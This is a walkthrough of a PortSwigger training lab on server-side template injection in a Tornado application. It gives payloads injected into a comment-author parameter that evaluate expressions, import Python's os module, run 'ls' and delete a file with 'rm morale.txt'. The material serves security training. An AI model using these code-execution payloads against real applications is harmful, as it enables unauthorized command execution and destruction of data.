The payloads in this file are meant to solve the following lab:
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context

After logging in with the credentials wiener:peter, we'll see an option to choose whether the application user our first name or our nickname. Switching to nickname and looking for where the name is reflected we'll come across the blog posts section where our nickname can be seen (H0td0g).

Intercepting a request to post a comment we'll see this parameter and value:
blog-post-author-display=user.nickname

Knowing the application uses Tornado we can check for server side template injection vulnerabilitites with the following payload:

blog-post-author-display=user.nickname}}{{ 4*4

After sending the POST request with the above payload we'll see our nickname has changed to "H0td0g16" so our injection was evaluated.

Now we can try to inject Python code to list the filed in the current working directory, so we'll also need to import os. The new payload should look like the following:
blog-post-author-display=user.nickname}}{% import os %} {{os.system("ls")

After sending the POST request with the above payload we'll see our new nickname is "morale.txt H0td0g 0".

Now that we know the morale.txt file for Carlos is in the current working directory we can remove it from the server with the following payload:
blog-post-author-display=user.nickname}}{% import os %} {{os.system("rm morale.txt")

Explanation of final payload:
}} - Closes first expression
{% import os %} - Directive to import os
{{os.system("rm morale.txt") - Expression to remove morale.txt

